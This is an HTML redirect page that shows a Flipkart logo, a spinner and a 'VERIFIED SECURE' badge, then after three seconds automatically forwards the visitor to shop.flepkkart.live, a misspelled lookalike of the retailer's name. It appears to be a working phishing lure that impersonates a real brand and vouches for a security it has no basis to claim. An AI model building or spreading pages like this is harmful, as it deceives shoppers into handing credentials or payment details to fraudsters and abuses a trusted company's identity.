<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="refresh" content="3;url=https://shop.flepkkart.live/shop">
  <title>Redirecting...</title>

  <style>
    body {
      margin: 0;
      height: 100vh;
      background: #0b1c33;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: Arial, sans-serif;
      color: #fff;
    }

    .card {
      background: #10294b;
      padding: 40px 30px;
      border-radius: 12px;
      text-align: center;
      width: 280px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.4);
    }

    .logo {
      width: 70px;
      height: 70px;
      border-radius: 50%;
      background: #fff;
      margin: 0 auto 15px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .logo img {
      width: 45px;
    }

    h2 {
      margin: 10px 0 5px;
      font-size: 20px;
      letter-spacing: 1px;
    }

    p {
      font-size: 14px;
      opacity: 0.8;
      margin-bottom: 20px;
    }

    .spinner {
      width: 40px;
      height: 40px;
      border: 4px solid rgba(255,255,255,0.3);
      border-top: 4px solid #1da1f2;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 15px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .secure {
      font-size: 12px;
      color: #9bc9ff;
    }
  </style>
</head>

<body>
  <div class="card">
    <div class="logo">
      <img src="https://img.icons8.com/?size=100&id=Noove1mRsJOq&format=png&color=000000" alt="Flipkart">
    </div>

    <h2>PLEASE WAIT</h2>
    <p>Redirecting to your destination…</p>

    <div class="spinner"></div>

    <div class="secure">✔️ VERIFIED SECURE</div>
  </div>
</body>
</html>
